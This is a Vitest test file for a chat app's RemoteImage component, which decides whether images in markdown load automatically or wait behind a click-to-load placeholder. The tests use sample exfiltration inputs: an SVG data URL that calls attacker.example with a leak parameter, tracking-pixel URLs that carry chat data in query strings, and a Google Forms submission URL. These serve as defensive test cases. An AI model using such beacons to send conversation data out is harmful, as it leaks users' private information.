// @vitest-environment happy-dom
import { BASE_URL } from '@actovia/shared/constants/systems'
import { TEST_IDS } from '@actovia/shared/constants/test-ids'
import type { WebSearchResult } from '@actovia/shared/types/web-search'
import { act, createElement } from 'react'
import { createRoot } from 'react-dom/client'
import { describe, expect, it, vi } from 'vitest'

const t = (key: string) => key
vi.mock('react-i18next', () => ({ useTranslation: () => ({ t }) }))

const {
  AllowedImageUrlsContext,
  RemoteImage,
  allowedImageUrls,
  loadsAutomatically
} = await import('@/components/markdown/remote-image')

;(
  globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true

const SOURCES: WebSearchResult[] = [
  {
    rank: 1,
    link: 'https://example.com/a',
    title: 'A',
    content: 'a',
    snippet: 'a',
    thumbnail: 'https://imgs.search.brave.com/thumb-a.jpg',
    favicon: 'https://imgs.search.brave.com/fav-a.png'
  },
  {
    rank: 2,
    link: 'https://other.example/b',
    title: 'B',
    content: 'b',
    snippet: 'b',
    hostname: 'other.example',
    media: [
      {
        kind: 'image',
        title: 'pic',
        url: 'https://other.example/photo.png',
        sourceUrl: 'https://other.example/b',
        thumbnailUrl: 'https://imgs.search.brave.com/thumb-b.jpg'
      },
      {
        kind: 'video',
        title: 'vid',
        url: 'https://video.example/watch?v=1',
        sourceUrl: 'https://video.example/watch?v=1'
      }
    ]
  },
  {
    rank: 3,
    link: 'https://plain.example/c',
    title: 'C',
    content: 'c',
    snippet: 'c',
    thumbnail: 'http://insecure.example/t.jpg'
  }
] as WebSearchResult[]

function render(
  src: string | undefined,
  alt: string,
  allowedUrls: ReadonlySet<string> | null = null
) {
  const host = document.createElement('div')
  const root = createRoot(host)
  const tree = createElement(
    AllowedImageUrlsContext.Provider,
    { value: allowedUrls },
    createElement(RemoteImage, { src, alt })
  )
  return { host, root, tree }
}

describe('allowedImageUrls', () => {
  it('collects the exact https image URLs the search returned — never pages or hosts', () => {
    const urls = allowedImageUrls(SOURCES)
    expect(urls).not.toBeNull()
    expect([...urls!].sort()).toEqual(
      [
        'https://imgs.search.brave.com/fav-a.png',
        'https://imgs.search.brave.com/thumb-a.jpg',
        'https://imgs.search.brave.com/thumb-b.jpg',
        'https://other.example/photo.png'
      ].sort()
    )
  })

  it('returns null with no results', () => {
    expect(allowedImageUrls()).toBeNull()
    expect(allowedImageUrls([])).toBeNull()
  })
})

const svgWithRemoteRef = (payload: string) =>
  `data:image/svg+xml;base64,${Buffer.from(payload).toString('base64')}`

describe('loadsAutomatically', () => {
  it('loads a raster data: URL and the app media route always', () => {
    expect(loadsAutomatically('data:image/png;base64,abc', null)).toBe(true)
    expect(
      loadsAutomatically(`${BASE_URL}/api/v1/media/chat-1/img.png`, null)
    ).toBe(true)
  })

  it('loads every raster MIME type', () => {
    for (const mime of [
      'image/png',
      'image/jpeg',
      'image/jpg',
      'image/gif',
      'image/webp',
      'image/avif'
    ]) {
      expect(loadsAutomatically(`data:${mime};base64,abc`, null)).toBe(true)
    }
  })

  it('matches the data: MIME case-insensitively', () => {
    expect(loadsAutomatically('DATA:IMAGE/PNG;BASE64,abc', null)).toBe(true)
    expect(loadsAutomatically('Data:Image/Png,abc', null)).toBe(true)
  })

  it('never auto-loads an SVG data: URL — it can resolve its own remote references', () => {
    const svg = svgWithRemoteRef(
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://attacker.example/?leak=1"/></svg>'
    )
    expect(loadsAutomatically(svg, null)).toBe(false)
  })

  it('never auto-loads a data: URL with another, missing, or malformed MIME', () => {
    expect(loadsAutomatically('data:text/html,<b>hi</b>', null)).toBe(false)
    expect(loadsAutomatically('data:,hello', null)).toBe(false)
    expect(loadsAutomatically('data:image/png', null)).toBe(false)
    expect(loadsAutomatically('data:image/png;base64', null)).toBe(false)
  })

  it('loads only an exact image URL the search returned (I6)', () => {
    const urls = allowedImageUrls(SOURCES)
    expect(
      loadsAutomatically('https://imgs.search.brave.com/thumb-a.jpg', urls)
    ).toBe(true)
    expect(loadsAutomatically('https://other.example/photo.png', urls)).toBe(
      true
    )
    // The injecting page's own host, beaconing chat data: not trusted.
    expect(
      loadsAutomatically('https://other.example/p.png?d=secret', urls)
    ).toBe(false)
    expect(loadsAutomatically('https://example.com/a.png', urls)).toBe(false)
    // A result page itself is not an image the search returned.
    expect(loadsAutomatically('https://example.com/a', urls)).toBe(false)
    // A Google Forms GET on a host a search surfaced.
    expect(
      loadsAutomatically(
        'https://docs.google.com/forms/d/e/x/formResponse?entry.1=data',
        new Set(['https://docs.google.com/forms/d/e/x/viewform'])
      )
    ).toBe(false)
  })

  it('never auto-loads http:, even when the search returned it', () => {
    const urls = allowedImageUrls(SOURCES)
    expect(loadsAutomatically('http://insecure.example/t.jpg', urls)).toBe(
      false
    )
  })

  it('refuses an unparsable src', () => {
    expect(
      loadsAutomatically('not a url', new Set(['https://example.com/']))
    ).toBe(false)
  })
})

describe('<RemoteImage>', () => {
  it('renders <img> for a data: URL', async () => {
    const { host, root, tree } = render('data:image/png;base64,abc', 'a pic')
    await act(async () => root.render(tree))
    expect(host.querySelector('img')?.getAttribute('src')).toBe(
      'data:image/png;base64,abc'
    )
    expect(host.querySelector(`[data-testid]`)).toBeNull()
  })

  it('renders a placeholder (no <img>) for an SVG data: URL, labelled "inline image"', async () => {
    const svg = svgWithRemoteRef(
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://attacker.example/?leak=1"/></svg>'
    )
    const { host, root, tree } = render(svg, 'a pic')
    await act(async () => root.render(tree))
    expect(host.querySelector('img')).toBeNull()
    const placeholder = host.querySelector(
      `[data-testid="${TEST_IDS.chat.remoteImage.placeholder}"]`
    )
    expect(placeholder).not.toBeNull()
    expect(placeholder?.textContent).toContain('remoteImage.inlineImage')
    expect(placeholder?.textContent).not.toContain('attacker.example')
  })

  it('renders <img> for the app media route', async () => {
    const src = `${BASE_URL}/api/v1/media/chat-1/img.png`
    const { host, root, tree } = render(src, 'a pic')
    await act(async () => root.render(tree))
    expect(host.querySelector('img')?.getAttribute('src')).toBe(src)
  })

  it('renders <img> for an image URL the search returned', async () => {
    const { host, root, tree } = render(
      'https://other.example/photo.png',
      'a pic',
      allowedImageUrls(SOURCES)
    )
    await act(async () => root.render(tree))
    expect(host.querySelector('img')?.getAttribute('src')).toBe(
      'https://other.example/photo.png'
    )
  })

  // A network image loads through LazyLoadImage (owner, 2026-09-30); a
  // data: URL is already here and is drawn directly.
  it('loads a network image through LazyLoadImage, a data: URL directly', async () => {
    const remote = render(
      'https://other.example/photo.png',
      'a pic',
      allowedImageUrls(SOURCES)
    )
    await act(async () => remote.root.render(remote.tree))
    expect(remote.host.querySelector('[data-slot="skeleton"]')).not.toBeNull()

    const inline = render('data:image/png;base64,iVBORw0KGgo=', 'x')
    await act(async () => inline.root.render(inline.tree))
    expect(inline.host.querySelector('img')).not.toBeNull()
    expect(inline.host.querySelector('[data-slot="skeleton"]')).toBeNull()
  })

  it("renders a placeholder for another URL on a search result's host", async () => {
    const { host, root, tree } = render(
      'https://other.example/pixel.png?d=chat-data',
      'a pic',
      allowedImageUrls(SOURCES)
    )
    await act(async () => root.render(tree))
    expect(host.querySelector('img')).toBeNull()
  })

  it('renders a placeholder (no <img>) for an unknown host — no request is made', async () => {
    const { host, root, tree } = render(
      'https://tracker.example/pixel.png',
      'a pic'
    )
    await act(async () => root.render(tree))
    expect(host.querySelector('img')).toBeNull()
    const placeholder = host.querySelector(
      `[data-testid="${TEST_IDS.chat.remoteImage.placeholder}"]`
    )
    expect(placeholder).not.toBeNull()
    expect(placeholder?.textContent).toContain('tracker.example')
    expect(placeholder?.textContent).toContain('a pic')
    expect(
      host.querySelector(
        `[data-testid="${TEST_IDS.chat.remoteImage.loadButton}"]`
      )
    ).not.toBeNull()
  })

  it('shows a placeholder for http:, even from an allowed host', async () => {
    const { host, root, tree } = render(
      'http://example.com/photo.png',
      'a pic',
      new Set(['http://example.com/photo.png'])
    )
    await act(async () => root.render(tree))
    expect(host.querySelector('img')).toBeNull()
    expect(
      host.querySelector(
        `[data-testid="${TEST_IDS.chat.remoteImage.placeholder}"]`
      )
    ).not.toBeNull()
  })

  it('loads on click, and stays loaded across a re-render', async () => {
    const src = 'https://tracker.example/click-once.png'
    const { host, root, tree } = render(src, 'a pic')
    await act(async () => root.render(tree))
    expect(host.querySelector('img')).toBeNull()

    const button = host.querySelector<HTMLButtonElement>(
      `[data-testid="${TEST_IDS.chat.remoteImage.loadButton}"]`
    )
    expect(button).not.toBeNull()
    await act(async () => button!.click())

    expect(host.querySelector('img')?.getAttribute('src')).toBe(src)
    expect(host.querySelector(`[data-testid]`)).toBeNull()

    // A fresh instance (unmounted and remounted) for the same src stays
    // loaded — "loaded" is remembered per src for the session, not per
    // component instance.
    await act(async () => root.unmount())
    const { host: host2, root: root2, tree: tree2 } = render(src, 'a pic')
    await act(async () => root2.render(tree2))
    expect(host2.querySelector('img')?.getAttribute('src')).toBe(src)
  })

  it('a different src on the same instance keeps its own auto-load decision', async () => {
    const host = document.createElement('div')
    const root = createRoot(host)
    const unknown = 'https://tracker.example/never-loaded.png'
    const known = 'https://example.com/known.png'
    const allowed = new Set(['https://example.com/known.png'])

    await act(async () =>
      root.render(
        createElement(
          AllowedImageUrlsContext.Provider,
          { value: allowed },
          createElement(RemoteImage, { src: unknown, alt: 'x' })
        )
      )
    )
    expect(host.querySelector('img')).toBeNull()

    await act(async () =>
      root.render(
        createElement(
          AllowedImageUrlsContext.Provider,
          { value: allowed },
          createElement(RemoteImage, { src: known, alt: 'x' })
        )
      )
    )
    expect(host.querySelector('img')?.getAttribute('src')).toBe(known)
  })
})
